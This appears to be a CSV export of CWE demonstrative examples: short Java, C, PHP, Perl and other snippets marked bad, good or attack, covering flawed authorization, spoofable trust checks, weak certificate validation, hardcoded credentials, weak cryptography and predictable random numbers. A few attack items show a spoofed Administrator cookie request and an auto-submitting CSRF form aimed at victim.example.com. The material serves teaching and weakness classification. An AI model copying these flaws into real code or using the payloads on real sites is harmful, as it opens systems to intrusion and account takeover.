LANGUAGE:Java:
                  
public enum Roles {
ADMIN,OPERATOR,USER,GUEST
}

                     
public void resetPassword(User requestingUser, User user, String password ){

                        
if(isAuthenticated(requestingUser)){

                              
switch(requestingUser.role){

                                    
case GUEST:
System.out.println(""You are not authorized to perform this command"");
break;

                                       
case USER:
System.out.println(""You are not authorized to perform this command"");
break;

                                       
default:
setPassword(user,password);
break;
}

                                 
}

                           

                           
else{
System.out.println(""You must be logged in to perform this command"");
}

                     
}

               "
269,
270,
271,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
chroot(APP_HOME);
chdir(""/"");
FILE* data = fopen(argv[1], ""r+"");
...

               "
272,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
setuid(0);

                     
// Do some important stuff

                     
setuid(old_uid);

                     
// Do some non privileged stuff.

                     

                  

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
method() {

                        
AccessController.doPrivileged(new PrivilegedAction()) {

                              
public Object run() {

                                    

                                       

                                       
// Insert all code here

                                       

                                    

                                 
}

                           
};

                     
}

               
example: 3
NATURE:bad:
LANGUAGE:C:
                  
chroot(APP_HOME);
chdir(""/"");
FILE* data = fopen(argv[1], ""r+"");
...

               "
273,"
example: 1
NATURE:bad:
LANGUAGE:C++:
                  
bool DoSecureStuff(HANDLE hPipe) {
bool fDataWritten = false;
ImpersonateNamedPipeClient(hPipe);
HANDLE hFile = CreateFile(...);
/../
RevertToSelf()
/../
}

               "
274,
276,
277,
278,
279,
280,
281,
282,
283,"
example: 1
NATURE:bad:
LANGUAGE:Python:
                  
def killProcess(processID):
os.kill(processID, signal.SIGKILL)

                  

               
example: 2
NATURE:good:
LANGUAGE:Python:
                  
def killProcess(processID):

                        
user = getCurrentUser()

                           

                           
#Check process owner against requesting user

                           
if getProcessOwner(processID) == user:
os.kill(processID, signal.SIGKILL)
return

                           
else:
print(""You cannot kill a process you don't own"")
return

                        

                     

                  

               "
284,
285,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  
function runEmployeeQuery($dbName, $name){
mysql_select_db($dbName,$globalDbHandle) or die(""Could not open Database"".$dbName);

                        
//Use a prepared statement to avoid CWE-89

                        
$preparedStatement = $globalDbHandle->prepare('SELECT * FROM employees WHERE name = :name');
$preparedStatement->execute(array(':name' => $name));
return $preparedStatement->fetchAll();
}

                     
/.../

                     

                     
$employeeRecord = runEmployeeQuery('EmployeeDB',$_GET['EmployeeName']);

               
example: 2
NATURE:bad:
LANGUAGE:Perl:
                  
sub DisplayPrivateMessage {
my($id) = @_;
my $Message = LookupMessageObject($id);
print ""From: "" . encodeHTML($Message->{from}) . ""<br>\n"";
print ""Subject: "" . encodeHTML($Message->{subject}) . ""\n"";
print ""<hr>\n"";
print ""Body: "" . encodeHTML($Message->{body}) . ""\n"";
}

                     
my $q = new CGI;

                     
# For purposes of this example, assume that CWE-309 and

                     

                     

                     

                     
# CWE-523 do not apply.

                     
if (! AuthenticateUser($q->param('username'), $q->param('password'))) {
ExitError(""invalid username or password"");
}

                     
my $id = $q->param('id');
DisplayPrivateMessage($id);

               "
286,
287,"
example: 1
NATURE:bad:
LANGUAGE:Perl:
                  
my $q = new CGI;

                     
if ($q->cookie('loggedin') ne ""true"") {

                        
if (! AuthenticateUser($q->param('username'), $q->param('password'))) {
ExitError(""Error: you need to log in first"");
}
else {

                              
# Set loggedin and user cookies.
$q->cookie(
-name => 'loggedin',
-value => 'true'
);

                                 
$q->cookie(
-name => 'user',
-value => $q->param('username')
);

                              

                           
}

                     
}

                     
if ($q->cookie('user') eq ""Administrator"") {
DoAdministratorTasks();
}

               
example: 2
NATURE:attack:
                  
GET /cgi-bin/vulnerable.cgi HTTP/1.1
Cookie: user=Administrator
Cookie: loggedin=true

                     
[body of request]

               "
288,
289,
290,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
String sourceIP = request.getRemoteAddr();
if (sourceIP != null && sourceIP.equals(APPROVED_IP)) {
authenticated = true;
}

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
sd = socket(AF_INET, SOCK_DGRAM, 0);
serv.sin_family = AF_INET;
serv.sin_addr.s_addr = htonl(INADDR_ANY);
servr.sin_port = htons(1008);
bind(sd, (struct sockaddr *) & serv, sizeof(serv));

                     
while (1) {
memset(msg, 0x0, MAX_MSG);
clilen = sizeof(cli);
if (inet_ntoa(cli.sin_addr)==getTrustedAddress()) {
n = recvfrom(sd, msg, MAX_MSG, 0, (struct sockaddr *) & cli, &clilen);
}
}

               
example: 3
NATURE:bad:
LANGUAGE:Java:
                  
while(true) {

                        
DatagramPacket rp=new DatagramPacket(rData,rData.length);
outSock.receive(rp);
String in = new String(p.getData(),0, rp.getLength());
InetAddress clientIPAddress = rp.getAddress();
int port = rp.getPort();

                           
if (isTrustedAddress(clientIPAddress) & secretKey.equals(in)) {
out = secret.getBytes();
DatagramPacket sp =new DatagramPacket(out,out.length, IPAddress, port); outSock.send(sp);
}

                     
}

               
example: 4
NATURE:bad:
LANGUAGE:C:
                  
struct hostent *hp;struct in_addr myaddr;
char* tHost = ""trustme.example.com"";
myaddr.s_addr=inet_addr(ip_addr_string);

                     
hp = gethostbyaddr((char *) &myaddr, sizeof(struct in_addr), AF_INET);
if (hp && !strncmp(hp->h_name, tHost, sizeof(tHost))) {
trusted = true;
} else {
trusted = false;
}

               
example: 5
NATURE:bad:
LANGUAGE:Java:
                  
String ip = request.getRemoteAddr();
InetAddress addr = InetAddress.getByName(ip);
if (addr.getCanonicalHostName().endsWith(""trustme.com"")) {
trusted = true;
}

               
example: 6
NATURE:bad:
LANGUAGE:C#:
                  
IPAddress hostIPAddress = IPAddress.Parse(RemoteIpAddress);
IPHostEntry hostInfo = Dns.GetHostByAddress(hostIPAddress);
if (hostInfo.HostName.EndsWith(""trustme.com"")) {
trusted = true;
}

               "
291,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
sd = socket(AF_INET, SOCK_DGRAM, 0);
serv.sin_family = AF_INET;
serv.sin_addr.s_addr = htonl(INADDR_ANY);
servr.sin_port = htons(1008);
bind(sd, (struct sockaddr *) & serv, sizeof(serv));

                     
while (1) {
memset(msg, 0x0, MAX_MSG);
clilen = sizeof(cli);
if (inet_ntoa(cli.sin_addr)==getTrustedAddress()) {
n = recvfrom(sd, msg, MAX_MSG, 0, (struct sockaddr *) & cli, &clilen);
}
}

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
while(true) {

                        
DatagramPacket rp=new DatagramPacket(rData,rData.length);
outSock.receive(rp);
String in = new String(p.getData(),0, rp.getLength());
InetAddress clientIPAddress = rp.getAddress();
int port = rp.getPort();

                           
if (isTrustedAddress(clientIPAddress) & secretKey.equals(in)) {
out = secret.getBytes();
DatagramPacket sp =new DatagramPacket(out,out.length, IPAddress, port); outSock.send(sp);
}

                     
}

               "
293,"
example: 1
NATURE:bad:
LANGUAGE:C++:
                  
String trustedReferer = ""http://www.example.com/""
while(true){
n = read(newsock, buffer, BUFSIZE);
requestPacket = processPacket(buffer, n);
if (requestPacket.referer == trustedReferer){
openNewSecureSession(requestPacket);
}
}

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
boolean processConnectionRequest(HttpServletRequest request){
String referer = request.getHeader(""referer"")
String trustedReferer = ""http://www.example.com/""
if(referer.equals(trustedReferer)){
openPrivilegedConnection(request);
return true;
}
else{
sendPrivilegeError(request);
return false;
}
}

               "
294,
295,
296,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
if ((cert = SSL_get_peer_certificate(ssl)) && host)
foo=SSL_get_verify_result(ssl);

                     
if ((X509_V_OK==foo) || X509_V_ERR_SELF_SIGNED_CERT_IN_CHAIN==foo))

                        

                           

                           
// certificate looks good, host can be trusted

                           

                        

                     

                  

               "
297,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
cert = SSL_get_peer_certificate(ssl);
if (cert && (SSL_get_verify_result(ssl)==X509_V_OK)) {

                        

                           

                           
// do secret things

                           

                        

                     
}

               "
298,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
if (cert = SSL_get_peer(certificate(ssl)) {

                        
foo=SSL_get_verify_result(ssl);
if ((X509_V_OK==foo) || (X509_V_ERR_CERT_HAS_EXPIRED==foo))

                              

                                 

                                 
//do stuff

                                 

                              

                           

                        

                     

                  

               "
299,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
if (cert = SSL_get_peer_certificate(ssl)) {

                        

                           

                           
// got a certificate, do secret things

                           

                        

                     

                  

               "
300,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
Socket sock;
PrintWriter out;

                     
try {

                        
sock = new Socket(REMOTE_HOST, REMOTE_PORT);
out = new PrintWriter(echoSocket.getOutputStream(), true);

                           

                           
// Write data to remote host via socket output stream.

                           
...

                     
}

               "
301,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
unsigned char *simple_digest(char *alg,char *buf,unsigned int len, int *olen) {
const EVP_MD *m;
EVP_MD_CTX ctx;
unsigned char *ret;
OpenSSL_add_all_digests();
if (!(m = EVP_get_digestbyname(alg))) return NULL;
if (!(ret = (unsigned char*)malloc(EVP_MAX_MD_SIZE))) return NULL;
EVP_DigestInit(&ctx, m);
EVP_DigestUpdate(&ctx,buf,len);
EVP_DigestFinal(&ctx,ret,olen);
return ret;
}
unsigned char *generate_password_and_cmd(char *password_and_cmd) {
simple_digest(""sha1"",password,strlen(password_and_cmd)
...
);
}

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
String command = new String(""some cmd to execute & the password"") MessageDigest encer = MessageDigest.getInstance(""SHA"");
encer.update(command.getBytes(""UTF-8""));
byte[] digest = encer.digest();

               "
302,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
boolean authenticated = new Boolean(getCookieValue(""authenticated"")).booleanValue();
if (authenticated) {
...
}

               "
303,
304,
305,
306,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public BankAccount createBankAccount(String accountNumber, String accountType,
String accountName, String accountSSN, double balance) {

                     

                        
BankAccount account = new BankAccount();
account.setAccountNumber(accountNumber);
account.setAccountType(accountType);
account.setAccountOwnerName(accountName);
account.setAccountOwnerSSN(accountSSN);
account.setBalance(balance);

                           
return account;

                     
}

               
example: 2
NATURE:good:
LANGUAGE:Java:
                  
private boolean isUserAuthentic = false;

                     

                     
// authenticate user,

                     

                     

                     
// if user is authenticated then set variable to true

                     

                     

                     
// otherwise set variable to false

                     
public boolean authenticateUser(String username, String password) {
...
}

                     
public BankAccount createNewBankAccount(String accountNumber, String accountType,
String accountName, String accountSSN, double balance) {

                        
BankAccount account = null;

                           
if (isUserAuthentic) {
account = new BankAccount();
account.setAccountNumber(accountNumber);
account.setAccountType(accountType);
account.setAccountOwnerName(accountName);
account.setAccountOwnerSSN(accountSSN);
account.setBalance(balance);
}
return account;

                     
}

               "
307,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
String username = request.getParameter(""username"");
String password = request.getParameter(""password"");

                     
int authResult = authenticateUser(username, password);

               
example: 2
NATURE:bad:
LANGUAGE:PHP:
                  
$username = $_POST['username'];
$password = $_POST['password'];
sleep(2000);
$isAuthenticated = authenticateUser($username, $password);

               
example: 3
NATURE:bad:
LANGUAGE:C:
                  
int validateUser(char *host, int port)
{

                        
int socket = openSocketConnection(host, port);
if (socket < 0) {
printf(""Unable to open socket connection"");
return(FAIL);
}

                           
int isValidUser = 0;
char username[USERNAME_SIZE];
char password[PASSWORD_SIZE];

                           
while (isValidUser == 0) {

                              
if (getNextMessage(socket, username, USERNAME_SIZE) > 0) {
if (getNextMessage(socket, password, PASSWORD_SIZE) > 0) {
isValidUser = AuthenticateUser(username, password);
}
}

                           
}
return(SUCCESS);

                     
}

               
example: 4
NATURE:good:
LANGUAGE:C:
                  
int validateUser(char *host, int port)
{

                        
...

                           
int count = 0;
while ((isValidUser == 0) && (count < MAX_ATTEMPTS)) {

                              
if (getNextMessage(socket, username, USERNAME_SIZE) > 0) {
if (getNextMessage(socket, password, PASSWORD_SIZE) > 0) {
isValidUser = AuthenticateUser(username, password);
}
}
count++;

                           
}
if (isValidUser) {
return(SUCCESS);
}
else {
return(FAIL);
}

                     
}

               "
308,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
unsigned char *check_passwd(char *plaintext) {
ctext = simple_digest(""sha1"",plaintext,strlen(plaintext), ... );

                        
//Login if hash matches stored hash

                        
if (equal(ctext, secret_password())) {
login_user();
}
}

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
String plainText = new String(plainTextIn);
MessageDigest encer = MessageDigest.getInstance(""SHA"");
encer.update(plainTextIn);
byte[] digest = password.digest();

                     
//Login if hash matches stored hash

                     
if (equal(digest,secret_password())) {
login_user();
}

               "
309,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
unsigned char *check_passwd(char *plaintext) {
ctext = simple_digest(""sha1"",plaintext,strlen(plaintext), ... );

                        
//Login if hash matches stored hash

                        
if (equal(ctext, secret_password())) {
login_user();
}
}

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
String plainText = new String(plainTextIn);
MessageDigest encer = MessageDigest.getInstance(""SHA"");
encer.update(plainTextIn);
byte[] digest = password.digest();

                     
//Login if hash matches stored hash

                     
if (equal(digest,secret_password())) {
login_user();
}

               "
311,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  
function persistLogin($username, $password){
$data = array(""username"" => $username, ""password""=> $password);
setcookie (""userdata"", $data);
}

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
server.sin_family = AF_INET; hp = gethostbyname(argv[1]);
if (hp==NULL) error(""Unknown host"");
memcpy( (char *)&server.sin_addr,(char *)hp->h_addr,hp->h_length);
if (argc < 3) port = 80;
else port = (unsigned short)atoi(argv[3]);
server.sin_port = htons(port);
if (connect(sock, (struct sockaddr *)&server, sizeof server) < 0) error(""Connecting"");
...
while ((n=read(sock,buffer,BUFSIZE-1))!=-1) {

                        

                           
write(dfd,password_buffer,n);
...

                        

                     

                  

               
example: 3
NATURE:bad:
LANGUAGE:Java:
                  
try {
URL u = new URL(""http://www.secret.example.org/"");
HttpURLConnection hu = (HttpURLConnection) u.openConnection();
hu.setRequestMethod(""PUT"");
hu.connect();
OutputStream os = hu.getOutputStream();
hu.disconnect();
}
catch (IOException e) {

                        

                           

                           
//...

                           

                        

                     
}

               "
312,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
response.addCookie( new Cookie(""userAccountID"", acctID);

               
example: 2
NATURE:bad:
LANGUAGE:PHP:
                  
function persistLogin($username, $password){
$data = array(""username"" => $username, ""password""=> $password);
setcookie (""userdata"", $data);
}

               
example: 3
NATURE:bad:
LANGUAGE:C:
                  
server.sin_family = AF_INET; hp = gethostbyname(argv[1]);
if (hp==NULL) error(""Unknown host"");
memcpy( (char *)&server.sin_addr,(char *)hp->h_addr,hp->h_length);
if (argc < 3) port = 80;
else port = (unsigned short)atoi(argv[3]);
server.sin_port = htons(port);
if (connect(sock, (struct sockaddr *)&server, sizeof server) < 0) error(""Connecting"");
...
while ((n=read(sock,buffer,BUFSIZE-1))!=-1) {

                        

                           
write(dfd,password_buffer,n);
...

                        

                     

                  

               
example: 4
NATURE:bad:
LANGUAGE:Java:
                  

                     

                     
# Java Web App ResourceBundle properties file

                     
...
webapp.ldap.username=secretUsername
webapp.ldap.password=secretPassword
...

               
example: 5
NATURE:bad:
LANGUAGE:ASP.NET:
                  
...
<connectionStrings>
<add name=""ud_DEV"" connectionString=""connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;"" providerName=""System.Data.Odbc"" />
</connectionStrings>
...

               "
313,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  

                     

                     
# Java Web App ResourceBundle properties file

                     
...
webapp.ldap.username=secretUsername
webapp.ldap.password=secretPassword
...

               
example: 2
NATURE:bad:
LANGUAGE:ASP.NET:
                  
...
<connectionStrings>
<add name=""ud_DEV"" connectionString=""connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;"" providerName=""System.Data.Odbc"" />
</connectionStrings>
...

               "
314,
315,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
response.addCookie( new Cookie(""userAccountID"", acctID);

               "
316,
317,
318,
319,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
try {
URL u = new URL(""http://www.secret.example.org/"");
HttpURLConnection hu = (HttpURLConnection) u.openConnection();
hu.setRequestMethod(""PUT"");
hu.connect();
OutputStream os = hu.getOutputStream();
hu.disconnect();
}
catch (IOException e) {

                        

                           

                           
//...

                           

                        

                     
}

               "
321,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
int VerifyAdmin(char *password) {

                        
if (strcmp(password,""68af404b513073584c4b6f22b6c63e6b"")) {

                              

                                 
printf(""Incorrect Password!\n"");
return(0);

                           
}
printf(""Entering Diagnostic Mode...\n"");
return(1);

                     
}

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
public boolean VerifyAdmin(String password) {
if (password.equals(""68af404b513073584c4b6f22b6c63e6b"")) {
System.out.println(""Entering Diagnostic Mode..."");
return true;
}
System.out.println(""Incorrect Password!"");
return false;

                  

               
example: 3
NATURE:bad:
LANGUAGE:C#:
                  
int VerifyAdmin(String password) {
if (password.Equals(""68af404b513073584c4b6f22b6c63e6b"")) {
Console.WriteLine(""Entering Diagnostic Mode..."");
return(1);
}
Console.WriteLine(""Incorrect Password!"");
return(0);
}

               "
322,
323,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
void encryptAndSendPassword(char *password){
char *nonce = ""bad"";
...
char *data = (unsigned char*)malloc(20);
int para_size = strlen(nonce) + strlen(password);
char *paragraph = (char*)malloc(para_size);
SHA1((const unsigned char*)paragraph,parsize,(unsigned char*)data);
sendEncryptedData(data)
}

               
example: 2
NATURE:bad:
LANGUAGE:C++:
                  
String command = new String(""some command to execute"");
MessageDigest nonce = MessageDigest.getInstance(""SHA"");
nonce.update(String.valueOf(""bad nonce""));
byte[] nonce = nonce.digest();
MessageDigest password = MessageDigest.getInstance(""SHA"");
password.update(nonce + ""secretPassword"");
byte[] digest = password.digest();
sendCommand(digest, command)

               "
324,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
if (cert = SSL_get_peer_certificate(ssl)) {

                        
foo=SSL_get_verify_result(ssl);
if ((X509_V_OK==foo) || (X509_V_ERRCERT_NOT_YET_VALID==foo))

                              

                                 

                                 
//do stuff

                                 

                              

                           

                        

                     
}

               "
325,
326,
327,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
EVP_des_ecb();

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
Cipher des=Cipher.getInstance(""DES..."");
des.initEncrypt(key2);

               
example: 3
NATURE:bad:
LANGUAGE:PHP:
                  
function encryptPassword($password){
$iv_size = mcrypt_get_iv_size(MCRYPT_DES, MCRYPT_MODE_ECB);
$iv = mcrypt_create_iv($iv_size, MCRYPT_RAND);
$key = ""This is a password encryption key"";
$encryptedPassword = mcrypt_encrypt(MCRYPT_DES, $key, $password, MCRYPT_MODE_ECB, $iv);
return $encryptedPassword;
}

               "
328,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
unsigned char *check_passwd(char *plaintext) {
ctext = simple_digest(""sha1"",plaintext,strlen(plaintext), ... );

                        
//Login if hash matches stored hash

                        
if (equal(ctext, secret_password())) {
login_user();
}
}

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
String plainText = new String(plainTextIn);
MessageDigest encer = MessageDigest.getInstance(""SHA"");
encer.update(plainTextIn);
byte[] digest = password.digest();

                     
//Login if hash matches stored hash

                     
if (equal(digest,secret_password())) {
login_user();
}

               "
329,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
EVP_CIPHER_CTX ctx;
char key[EVP_MAX_KEY_LENGTH];
char iv[EVP_MAX_IV_LENGTH];
RAND_bytes(key, b);
memset(iv,0,EVP_MAX_IV_LENGTH);
EVP_EncryptInit(&ctx,EVP_bf_cbc(), key,iv);

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
public class SymmetricCipherTest {

                        
public static void main() {

                              

                                 
byte[] text =""Secret"".getBytes();
byte[] iv ={
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
};
KeyGenerator kg = KeyGenerator.getInstance(""DES"");
kg.init(56);
SecretKey key = kg.generateKey();
Cipher cipher = Cipher.getInstance(""DES/ECB/PKCS5Padding"");
IvParameterSpec ips = new IvParameterSpec(iv);
cipher.init(Cipher.ENCRYPT_MODE, key, ips);
return cipher.doFinal(inpBytes);

                           
}

                     
}

               "
330,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  
function generateSessionID($userID){
srand($userID);
return rand();
}

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
String GenerateReceiptURL(String baseUrl) {
Random ranGen = new Random();
ranGen.setSeed((new Date()).getTime());
return(baseUrl + ranGen.nextInt(400000000) + "".html"");
}

               "
331,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  
function generateSessionID($userID){
srand($userID);
return rand();
}

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
String GenerateReceiptURL(String baseUrl) {
Random ranGen = new Random();
ranGen.setSeed((new Date()).getTime());
return(baseUrl + ranGen.nextInt(400000000) + "".html"");
}

               "
332,
333,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
while (1){

                        
if (haveNewConnection()){
if (hwRandom()){
int sessionID = hwRandom();
createNewConnection(sessionID);
} } }

                        

                     

                  

               "
334,"
example: 1
NATURE:bad:
LANGUAGE:XML:
                  
<sun-web-app>

                        
...
<session-config>

                              
<session-properties>
<property name=""idLengthBytes"" value=""8"">
<description>The number of bytes in this web module's session ID.</description>
</property>
</session-properties>

                           
</session-config>
...

                     
</sun-web-app>

               "
335,
336,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
private static final long SEED = 1234567890;
public int generateAccountID() {
Random random = new Random(SEED);
return random.nextInt();
}

               "
337,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
Random random = new Random(System.currentTimeMillis());
int accountID = random.nextInt();

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
srand(time());
int randNum = rand();

               "
338,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
Random random = new Random(System.currentTimeMillis());
int accountID = random.nextInt();

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
srand(time());
int randNum = rand();

               "
339,
340,
341,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  
function generateSessionID($userID){
srand($userID);
return rand();
}

               "
342,
343,
344,
345,
346,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
IntentFilter filter = new IntentFilter(""com.example.RemoveUser"");
MyReceiver receiver = new MyReceiver();
registerReceiver(receiver, filter);

                     
public class DeleteReceiver extends BroadcastReceiver {
@Override
public void onReceive(Context context, Intent intent) {
int userID = intent.getIntExtra(""userID"");
destroyUserData(userID);
}
}

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  

                     

                     
// Android

                     
@Override
public boolean shouldOverrideUrlLoading(WebView view, String url){

                        
if (url.substring(0,14).equalsIgnoreCase(""examplescheme:"")){
if(url.substring(14,25).equalsIgnoreCase(""getUserInfo"")){
writeDataToView(view, UserData);
return false;
}
else{
return true;
}
}

                     
}

               
example: 3
NATURE:bad:
LANGUAGE:Objective-C:
                  

                     

                     
// iOS

                     
-(BOOL) webView:(UIWebView *)exWebView shouldStartLoadWithRequest:(NSURLRequest *)exRequest navigationType:(UIWebViewNavigationType)exNavigationType
{

                        
NSURL *URL = [exRequest URL];
if ([[URL scheme] isEqualToString:@""exampleScheme""])
{

                              
NSString *functionString = [URL resourceSpecifier];
if ([functionString hasPrefix:@""specialFunction""])
{

                                    

                                       

                                       
// Make data available back in webview.

                                       
UIWebView *webView = [self writeDataToView:[URL query]];

                                 
}
return NO;

                           
}
return YES;

                     
}

               
example: 4
NATURE:attack:
LANGUAGE:JavaScript:
                  
window.location = examplescheme://method?parameter=value

               "
347,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
File f = new File(downloadedFilePath);
JarFile jf = new JarFile(f);

               "
348,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  
$requestingIP = '0.0.0.0';
if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) {
$requestingIP = $_SERVER['HTTP_X_FORWARDED_FOR'];

                     
else{
$requestingIP = $_SERVER['REMOTE_ADDR'];
}

                     
if(in_array($requestingIP,$ipWhitelist)){
generatePage();
return;
}
else{
echo ""You are not authorized to view this page"";
return;
}

               
example: 2
NATURE:good:
LANGUAGE:PHP:
                  
$requestingIP = '0.0.0.0';
if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) {
echo ""This application cannot be accessed through a proxy."";
return;

                     
else{
$requestingIP = $_SERVER['REMOTE_ADDR'];
}

                     
...

                     

                  

               "
349,
350,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
struct hostent *hp;struct in_addr myaddr;
char* tHost = ""trustme.example.com"";
myaddr.s_addr=inet_addr(ip_addr_string);

                     
hp = gethostbyaddr((char *) &myaddr, sizeof(struct in_addr), AF_INET);
if (hp && !strncmp(hp->h_name, tHost, sizeof(tHost))) {
trusted = true;
} else {
trusted = false;
}

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
String ip = request.getRemoteAddr();
InetAddress addr = InetAddress.getByName(ip);
if (addr.getCanonicalHostName().endsWith(""trustme.com"")) {
trusted = true;
}

               
example: 3
NATURE:bad:
LANGUAGE:C#:
                  
IPAddress hostIPAddress = IPAddress.Parse(RemoteIpAddress);
IPHostEntry hostInfo = Dns.GetHostByAddress(hostIPAddress);
if (hostInfo.HostName.EndsWith(""trustme.com"")) {
trusted = true;
}

               
example: 4
NATURE:bad:
LANGUAGE:C:
                  
sd = socket(AF_INET, SOCK_DGRAM, 0);
serv.sin_family = AF_INET;
serv.sin_addr.s_addr = htonl(INADDR_ANY);
servr.sin_port = htons(1008);
bind(sd, (struct sockaddr *) & serv, sizeof(serv));
while (1) {

                        

                           
memset(msg, 0x0, MAX_MSG);
clilen = sizeof(cli);
h=gethostbyname(inet_ntoa(cliAddr.sin_addr));
if (h->h_name==...) n = recvfrom(sd, msg, MAX_MSG, 0, (struct sockaddr *) & cli, &clilen);

                     
}

               
example: 5
NATURE:bad:
LANGUAGE:Java:
                  
while(true) {

                        
DatagramPacket rp=new DatagramPacket(rData,rData.length);
outSock.receive(rp);
String in = new String(p.getData(),0, rp.getLength());
InetAddress IPAddress = rp.getAddress();
int port = rp.getPort();
if ((rp.getHostName()==...) & (in==...)) {

                              

                                 
out = secret.getBytes();
DatagramPacket sp =new DatagramPacket(out,out.length, IPAddress, port);
outSock.send(sp);

                           
}

                     
}

               "
351,
352,"
example: 1
NATURE:bad:
LANGUAGE:HTML:
                  
<form action=""/url/profile.php"" method=""post"">
<input type=""text"" name=""firstname""/>
<input type=""text"" name=""lastname""/>
<br/>
<input type=""text"" name=""email""/>
<input type=""submit"" name=""submit"" value=""Update""/>
</form>

               
example: 2
NATURE:bad:
LANGUAGE:PHP:
                  
// initiate the session in order to validate sessions

                     
session_start();

                     

                     
//if the session is registered to a valid user then allow update

                     

                     
if (! session_is_registered(""username"")) {

                        

                           
echo ""invalid session detected!"";

                           

                           
// Redirect user to login page

                           
[...]

                           
exit;

                     
}

                     

                     
// The user session is valid, so process the request

                     

                     

                     
// and update the information

                     

                     
update_profile();

                     
function update_profile {

                        

                           

                           
// read in the data from $POST and send an update

                           

                           

                           
// to the database

                           
SendUpdateToDatabase($_SESSION['username'], $_POST['email']);
[...]
echo ""Your profile has been successfully updated."";

                     
}

               
example: 3
NATURE:attack:
LANGUAGE:HTML:
                  
<SCRIPT>
function SendAttack () {
form.email = ""attacker@example.com"";

                        
// send to profile.php

                        
form.submit();
}
</SCRIPT>

                     
<BODY onload=""javascript:SendAttack();"">

                     
<form action=""http://victim.example.com/profile.php"" id=""form"" method=""post"">
<input type=""hidden"" name=""firstname"" value=""Funny"">
<input type=""hidden"" name=""lastname"" value=""Joke"">
<br/>
<input type=""hidden"" name=""email"">
</form>

               "
353,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
while(true) {
DatagramPacket rp = new DatagramPacket(rData,rData.length);
outSock.receive(rp);
InetAddress IPAddress = rp.getAddress();
int port = rp.getPort();
out = secret.getBytes();
DatagramPacket sp =new DatagramPacket(out, out.length, IPAddress, port);
outSock.send(sp);
}

               "
354,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
sd = socket(AF_INET, SOCK_DGRAM, 0); serv.sin_family = AF_INET;
serv.sin_addr.s_addr = htonl(INADDR_ANY);
servr.sin_port = htons(1008);
bind(sd, (struct sockaddr *) & serv, sizeof(serv));
while (1) {

                        

                           
memset(msg, 0x0, MAX_MSG);
clilen = sizeof(cli);
if (inet_ntoa(cli.sin_addr)==...) n = recvfrom(sd, msg, MAX_MSG, 0, (struct sockaddr *) & cli, &clilen);

                     
}

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
while(true) {
DatagramPacket packet = new DatagramPacket(data,data.length,IPAddress, port);
socket.send(sendPacket);
}

               "
356,
357,
358,
359,"
example: 1
NATURE:bad:
LANGUAGE:C#:
                  
pass = GetPassword();
...
dbmsLog.WriteLine(id + "":"" + pass + "":"" + type + "":"" + tstamp);

               
example: 2
NATURE:bad:
LANGUAGE:XML:
                  
<uses-permission android:name=""android.permission.ACCESS_FINE_LOCATION""/>

               
example: 3
NATURE:bad:
LANGUAGE:Java:
                  
locationClient = new LocationClient(this, this, this);
locationClient.connect();
Location userCurrLocation;
userCurrLocation = locationClient.getLastLocation();
deriveStateFromCoords(userCurrLocation);

               "
360,"
example: 1
NATURE:bad:
